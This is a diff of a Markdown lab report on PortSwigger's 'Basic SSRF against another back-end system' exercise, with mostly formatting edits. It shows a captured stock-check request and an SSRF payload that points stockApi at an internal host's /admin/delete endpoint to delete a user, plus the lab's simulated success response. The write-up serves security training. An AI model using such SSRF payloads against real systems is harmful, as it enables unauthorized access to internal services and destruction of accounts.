@@ -3,9 +3,13 @@
 
 
 **Report ID:** PS-LAB-SSRF-002  
+
 **Author:** Abhi (Abhiram)  
+
 **Date:** February 13, 2026  
+
 **Lab Level:** Apprentice  
+
 **Lab Title:** Basic SSRF against another back-end system
 
 
@@ -30,11 +34,15 @@ Unauthorized access to internal networks, admin panels, or other back-end servic
 
 ## Environment and Tools Used:
 
-- **Target:** Simulated e-commerce site from PortSwigger Web Security Academy (`https://*.web-security-academy.net`)
-- **Browser:** Google Chrome (Version 120.0 or similar)
-- **Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy, Repeater, Intruder
-- **Operating System:** Windows 11
-- **Test Date/Time:** February 13, 2026, approximately 10:44 AM IST
+**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (`https://*.web-security-academy.net`)
+
+**Browser:** Google Chrome (Version 120.0 or similar)
+
+**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy, Repeater, Intruder
+
+**Operating System:** Windows 11
+
+**Test Date/Time:** February 13, 2026, approximately 10:44 AM IST
 
 
 
@@ -61,7 +69,7 @@ Conducted following ethical hacking best practices in a simulated environment.
 
 **Vulnerable Endpoint:** `POST /product/stock` (stock check)
 
-### Original Request (Captured in Burp)
+**Original Request (Captured in Burp):**
 
 ```http
 POST /product/stock HTTP/2
@@ -104,10 +112,17 @@ stockApi=http://192.168.0.64:8080/admin/delete?username=carlos
 
 
 Response:
+
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 
-User deleted successfully!
+<!DOCTYPE html>
+<!-- Lab header: "SOLVED" status -->
+<p>User deleted successfully!</p>
+<h1>Users</h1>
+<div>wiener - <a href="/admin/delete?username=wiener">Delete</a></div>
+<!-- Carlos account removed 
+
 
 
 
